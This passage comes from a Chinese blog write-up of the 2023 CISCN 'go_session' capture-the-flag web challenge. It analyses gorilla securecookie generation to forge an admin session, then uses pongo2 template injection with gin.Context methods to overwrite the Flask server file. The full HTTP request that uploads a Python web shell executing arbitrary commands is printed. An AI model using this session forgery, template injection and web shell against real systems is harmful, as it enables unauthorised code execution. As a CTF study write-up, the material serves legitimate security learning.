3. Create MAC for &quot;name|date|value&quot;. Extra pipe to be used later.</span></span><br><span class="line">	b = []<span class="type">byte</span>(fmt.Sprintf(<span class="string">&quot;%s|%d|%s|&quot;</span>, name, s.timestamp(), b))</span><br><span class="line">	mac := createMac(hmac.New(s.hashFunc, s.hashKey), b[:<span class="built_in">len</span>(b)<span class="number">-1</span>])</span><br><span class="line">	<span class="comment">// Append mac, remove name.</span></span><br><span class="line">	b = <span class="built_in">append</span>(b, mac...)[<span class="built_in">len</span>(name)+<span class="number">1</span>:]</span><br><span class="line">	<span class="comment">// 4. Encode to base64.</span></span><br><span class="line">	b = encode(b)</span><br><span class="line">	<span class="comment">// 5. Check length.</span></span><br><span class="line">	<span class="keyword">if</span> s.maxLength != <span class="number">0</span> &amp;&amp; <span class="built_in">len</span>(b) &gt; s.maxLength &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, errEncodedValueTooLong</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Done.</span></span><br><span class="line">	<span class="keyword">return</span> <span class="type">string</span>(b), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注释给的很明显了，主要是五个步骤去生成cookie：</p>
<ol>
<li>序列化session数据</li>
<li>（可选）加密Encrypt</li>
<li>base64编码</li>
<li>生成 HMAC 签名并附加签名</li>
<li>再次base64编码</li>
</ol>
<p>然后我们分开看一下</p>
<p>首先是序列化的过程，跟进一下Serialize接口</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Serializer <span class="keyword">interface</span> &#123;</span><br><span class="line">	Serialize(src <span class="keyword">interface</span>&#123;&#125;) ([]<span class="type">byte</span>, <span class="type">error</span>)</span><br><span class="line">	Deserialize(src []<span class="type">byte</span>, dst <span class="keyword">interface</span>&#123;&#125;) <span class="type">error</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个是把 Go 对象序列化为 <code>[]byte</code>，一个是把 <code>[]byte</code> 反序列化为 Go 对象，这里调用的是序列化方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e GobEncoder)</span></span> Serialize(src <span class="keyword">interface</span>&#123;&#125;) ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	buf := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">	enc := gob.NewEncoder(buf)</span><br><span class="line">	<span class="keyword">if</span> err := enc.Encode(src); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, cookieError&#123;cause: err, typ: usageError&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> buf.Bytes(), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>gob.NewEncoder</code> 返回一个 Gob 编码器，随后利用编码器将 <code>src</code> 序列化成 Gob 格式的字节并返回</p>
<p>第二个是加密，先是检查block 加密块是否为空，如果不为空说明用户提供了加密的key，所以调用encrypt进行加密</p>
<p>那么block 是怎么来的呢？其实就是当你调用 <code>sessions.NewCookieStore(keyPairs...)</code> 时，如果提供了第二个 key，SecureCookie 会用它生成 <code>block</code> 对象，用于加密，但是我们代码里面并没有提供第二个key，所以这里的话是没用到加密的，直接跳过了</p>
<p>第三个就是base64编码，没什么好说的</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// encode encodes a value using base64.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">encode</span><span class="params">(value []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">	encoded := <span class="built_in">make</span>([]<span class="type">byte</span>, base64.URLEncoding.EncodedLen(<span class="built_in">len</span>(value)))</span><br><span class="line">	base64.URLEncoding.Encode(encoded, value)</span><br><span class="line">	<span class="keyword">return</span> encoded</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第四个是创建HMAC</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3. Create MAC for &quot;name|date|value&quot;. Extra pipe to be used later.</span></span><br><span class="line">b = []<span class="type">byte</span>(fmt.Sprintf(<span class="string">&quot;%s|%d|%s|&quot;</span>, name, s.timestamp(), b))</span><br><span class="line">mac := createMac(hmac.New(s.hashFunc, s.hashKey), b[:<span class="built_in">len</span>(b)<span class="number">-1</span>])</span><br><span class="line"><span class="comment">// Append mac, remove name.</span></span><br><span class="line">b = <span class="built_in">append</span>(b, mac...)[<span class="built_in">len</span>(name)+<span class="number">1</span>:]</span><br></pre></td></tr></table></figure>

<p>先是分别提取出Cookie 的名称以及当前时间戳（秒级）和生成的序列化字节，用<code>|</code>拼接成字符串格式，然后通过createMac创建Mac签名，hashFunc通常是 SHA1 或 SHA256，hmac的New方法用于创建一个HMAC对象</p>
<p>最后把 MAC 拼接到数据末尾并移除开头的<code>name|</code>，到此b的内容就变成了</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;timestamp|value|mac&quot;</span></span><br></pre></td></tr></table></figure>

<p>第五步就是二次base64编码了</p>
<p>至此我们明白了cookie的生成步骤依次是</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.Values -&gt; Serialize得到序列化字节 -&gt; Encrypt(可选加密) -&gt; Base64 -&gt; 拼接 name|timestamp|value → HMAC → 移除 name 添加HMAC签名 → Base64 → Cookie</span><br></pre></td></tr></table></figure>

<p>所以其实解密的话倒过来就可以了，但是问题是里面的SESSION_KEY 是我们未知的，所以我们只能暂时认为他并不存在，那么其他的因素都是一样的，就可以本地起环境拿到cookie</p>
<p>把源码改一下，将session的name设置为admin并保存，这样更方便获取</p>
<p><img src="/../image/achieve/202411/CISCN/image-20250917150851284.png" alt="image-20250917150851284"></p>
<p>然后我们运行main方法并访问<code>/</code>拿到cookie</p>
<p><img src="/../image/achieve/202411/CISCN/image-20250917151138816.png" alt="image-20250917151138816"></p>
<p>在题目环境中访问admin并改cookie</p>
<p><img src="/../image/achieve/202411/CISCN/image-20250917151231149.png" alt="image-20250917151231149"></p>
<p>这样session就伪造成功了，下一步就是看看能不能打pongo2的ssti</p>
<h3 id="pongo2如何SSTI"><a href="#pongo2如何SSTI" class="headerlink" title="pongo2如何SSTI"></a>pongo2如何SSTI</h3><p>先去翻一下官方文档</p>
<p> <a target="_blank" rel="noopener" href="https://pkg.go.dev/github.com/flosch/pongo2#section-readme">https://pkg.go.dev/github.com/flosch/pongo2#section-readme</a></p>
<p>发现pongo2 是一种类似于模板语言的 Django 语法。</p>
<p>然后我去翻了一下Django 的官方文档</p>
<p> <a target="_blank" rel="noopener" href="https://docs.djangoproject.com/en/dev/topics/templates/">https://docs.djangoproject.com/en/dev/topics/templates/</a></p>
<p>随便传个<code>?name=&#123;&#123;8*8&#125;&#125;</code>发现有回显64，那就确定是ssti了</p>
<h3 id="c-gin-Context的使用"><a href="#c-gin-Context的使用" class="headerlink" title="c *gin.Context的使用"></a>c *gin.Context的使用</h3><p><code>gin.Context</code> 是 Gin 框架定义的结构体，而<code>c *gin.Context</code> 表示它是一个指针，代表 <strong>请求的上下文对象</strong>，里面封装了请求和响应的所有信息。</p>
<p><img src="/../image/achieve/202411/CISCN/image-20250917154633299.png" alt="image-20250917154633299"></p>
<p>可以看到这里有保存请求的所有信息，也能写出响应数据，跟进Request可以看到有很多方法能调用</p>
<p><img src="/../image/achieve/202411/CISCN/image-20250917155050077.png" alt="image-20250917155050077"></p>
<p>结合上面的我们可以写出payload</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;c.Request.UserAgent&#125;&#125;</span><br><span class="line">&#123;&#123;c.Request.Referer&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>然后看看c.Query()方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Context)</span></span> Query(key <span class="type">string</span>) (value <span class="type">string</span>) &#123;</span><br><span class="line">	value, _ = c.GetQuery(key)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接收一个key，但是很遗憾这里不能用单双引号去包括字符串，看看能不能从其他函数找到思路</p>
<p>ClientIP()</p>
<p><img src="/../image/achieve/202411/CISCN/image-20250917164411801.png" alt="image-20250917164411801"></p>
<p>本来想着伪造请求头看看能不能控制返回值的但是后面发现不行，那我们尝试把ip地址当成是参数传进去试一下</p>
<p><img src="/../image/achieve/202411/CISCN/image-20250917164622271.png" alt="image-20250917164622271"></p>
<p>然后用include标签打任意文件读取，但是为什么不返回嘞？？？哦原来是html转义了<code>/</code></p>
<p>好吧，可能方向错了，我们转向看flask路由，发现这里有一个坑点</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>这里的话直接拼接了name进去，所以我们如果直接传?name&#x3D;111的话，实际上url就变成了<code>http://127.0.0.1:5000/111</code>，所以我们真正需要传参的话需要传<code>?name=%3fname=111</code></p>
<p>这里的话如果err的话有报错信息，我们尝试传一个空值导致报错看看</p>
<p><img src="/../image/achieve/202411/CISCN/image-20250917170409106.png" alt="image-20250917170409106"></p>
<p>我这里直接把这段回显放到一个html文件中打开看</p>
<p><img src="/../image/achieve/202411/CISCN/image-20250917170505607.png" alt="image-20250917170505607"></p>
<p>有pin码，说不定有debug测试页面？但是这里的话是3.9版本，暂时还没有计算pin码的方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> name + <span class="string">&quot; no ssti&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>可以看到这里开启了debug模式，debug模式会带来自动重载，也就是<strong>热部署</strong>（修改了代码后，Flask 会自动重启应用）</p>
<p><strong>我们知道pongo2模板引擎存在注入点，可以执行go的代码，所以我们可以先上传文件覆盖server.py，再访问<code>/flask</code>路由，来执行命令</strong></p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>可以用<strong>SaveUploadedFile</strong>去上传文件</p>
<p><img src="/../image/achieve/202411/CISCN/image-20250917170913551.png" alt="image-20250917170913551"></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;c.SaveUploadedFile(c.FormFile(<span class="string">&quot;file&quot;</span>),<span class="string">&quot;/app/server.py&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>但是之前讲过，有一个html转义会转义单双引号，需要做一个绕过，第一个参数可以用<code>c.ClientIP()</code>，第二个参数可以用<code>c.Query(c.ClientIP())</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.ClientIP()),c.Query(c.ClientIP()))&#125;&#125;&amp;&#123;&#123;ip&#125;&#125;=/app/server.py</span><br></pre></td></tr></table></figure>

<p>构造上传包，需要添加Content-Type 头</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对表单提交，浏览器会自动设置合适的 Content-Type 请求，同时 生成一个唯一的边界字符串，并在请求体中使用这个边界字符串将不的表单字段和文件进行分隔。如果表单中包含文件上传的功能，需要 使用 multipart/form-data 类型的请求体格式。</span><br></pre></td></tr></table></figure>

<p>但是我这里用hackbar换成multipart&#x2F;form-data发个post包后就自己添加了这个请求头，只需要把POST换成GET就行了</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.ClientIP()),c.Query(c.ClientIP()))&#125;&#125;&amp;61.48.133.102=/app/server.py</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>bcc324df-beda-46b1-a0e0-dbec185f543b.challenge.ctf.show</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;140&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;140&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://bcc324df-beda-46b1-a0e0-dbec185f543b.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryA2FWd8UDzj0cCZc7</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://bcc324df-beda-46b1-a0e0-dbec185f543b.challenge.ctf.show/admin?name=111</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>cf_clearance=ZuK66QChNGftyyiGS39xGqXjRvrgqwc7dpOpwNp8hgY-1747317016-1.2.1.1-SHtYMtmhonoQh3f9JFLxlX5e8ZPl2H.d.1t6d9JUkU8A48zWJ8kwl3L9eAExpcFayYenFfR8OxZ7NWlafUA3eW..1Ql.yEeMVQsO2dN0LeOWb9v9mBTw9f9lNiJBsuz0wNfBuxQoVypAzPhH9KeUpkB22hemlwS35.DR.pfloutzMUBCc7K.SMPWBv0hD22WPrXL6TOwx.8Vlv0exiJGfJydMDF8Fmgi7BwFDHfm8A27bqv1xzCh1xdEneeUo.dok_1cBQWYDpbP2ClHu0miDKBW2hnvhGXG7HbMovGYSE3c1QFXa0TPiCQYSEXDX_10Bnlxz9QrXZujCxO7ZGcQA_vDxzoYodJRpDZrLpAsbq8; session-name=MTc1ODA5MzA4MnxEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXzFSUaBbGBEsxTg77L_c8gMK1zVAt1vaRY5vmZgdMIURg==</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>46</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryA2FWd8UDzj0cCZc7--</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;61.48.133.102&quot;; filename=&quot;shell.py&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">import</span> os</span></span><br><span class="line"><span class="language-pgsql">app = Flask(__name__)</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">@app.route(<span class="string">&#x27;/&#x27;</span>)</span></span><br><span class="line"><span class="language-pgsql">def <span class="keyword">index</span>():</span></span><br><span class="line"><span class="language-pgsql">    <span class="type">name</span> = request.args[<span class="string">&#x27;name&#x27;</span>]</span></span><br><span class="line"><span class="language-pgsql">    file=os.popen(<span class="type">name</span>).<span class="keyword">read</span>()</span></span><br><span class="line"><span class="language-pgsql">    <span class="keyword">return</span> file</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">if</span> __name__ == &quot;__main__&quot;:</span></span><br><span class="line"><span class="language-pgsql">    app.run(host=&quot;0.0.0.0&quot;, port=<span class="number">5000</span>, <span class="keyword">debug</span>=<span class="keyword">True</span>)</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryA2FWd8UDzj0cCZc7--</span></span></span><br></pre></td></tr></table></figure>

<p>返回200后通过&#x2F;flask?name&#x3D;%3fname&#x3D;env去执行命令</p>
<p><img src="/../image/achieve/202411/CISCN/image-20250917173159730.png" alt="image-20250917173159730"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">H0me</a></li>
        
          <li><a href="/about/">A6out</a></li>
        
          <li><a href="/tags/">T6gs</a></li>
        
          <li><a href="/categories/">Catagory</a></li>
        
          <li><a href="/links/">L1nks</a></li>
        
          <li><a href="/search/">s4arch</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Unzip"><span class="toc-number">1.</span> <span class="toc-text">Unzip</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unzip-%E8%BD%AF%E8%BF%9E%E6%8E%A5getshell"><span class="toc-number">1.1.</span> <span class="toc-text">#unzip+软连接getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#go-session"><span class="toc-number">2.</span> <span class="toc-text">go_session</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">源码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie%E7%9A%84%E7%94%9F%E6%88%90"><span class="toc-number">2.2.</span> <span class="toc-text">cookie的生成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pongo2%E5%A6%82%E4%BD%95SSTI"><span class="toc-number">2.3.</span> <span class="toc-text">pongo2如何SSTI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#c-gin-Context%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">2.4.</span> <span class="toc-text">c *gin.Context的使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-number">2.5.</span> <span class="toc-text">POC</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/09/16/2023CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/09/16/2023CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/&text=2023CISCN国赛web浮现"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/09/16/2023CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/&title=2023CISCN国赛web浮现"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/09/16/2023CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/&is_video=false&description=2023CISCN国赛web浮现"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=2023CISCN国赛web浮现&body=Check out this article: https://wanth3f1ag.top/2025/09/16/2023CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/09/16/2023CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/&title=2023CISCN国赛web浮现"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/09/16/2023CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/&title=2023CISCN国赛web浮现"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/09/16/2023CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/&title=2023CISCN国赛web浮现"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/09/16/2023CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/&title=2023CISCN国赛web浮现"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/09/16/2023CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/&name=2023CISCN国赛web浮现&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/09/16/2023CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/&t=2023CISCN国赛web浮现"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        
<footer id="footer">
    <div class="footer-left">
        Copyright ©
        
        
        2024-2025
        wanTh3flag
        <br>
    </div>
    
    <div class="footer-right">
        <nav>
            <ul>
                <!--
                --><li><a href="/">H0me</a></li><!--
                --><!--
                --><li><a href="/about/">A6out</a></li><!--
                --><!--
                --><li><a href="/tags/">T6gs</a></li><!--
                --><!--
                --><li><a href="/categories/">Catagory</a></li><!--
                --><!--
                --><li><a href="/links/">L1nks</a></li><!--
                --><!--
                --><li><a href="/search/">s4arch</a></li><!--
                -->
            </ul>
            <ul>
                
                <!-- 不蒜子统计 -->
                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
                <span class="post-meta-divider">|</span>
                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
                
            </ul>
        </nav>
    </div>
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
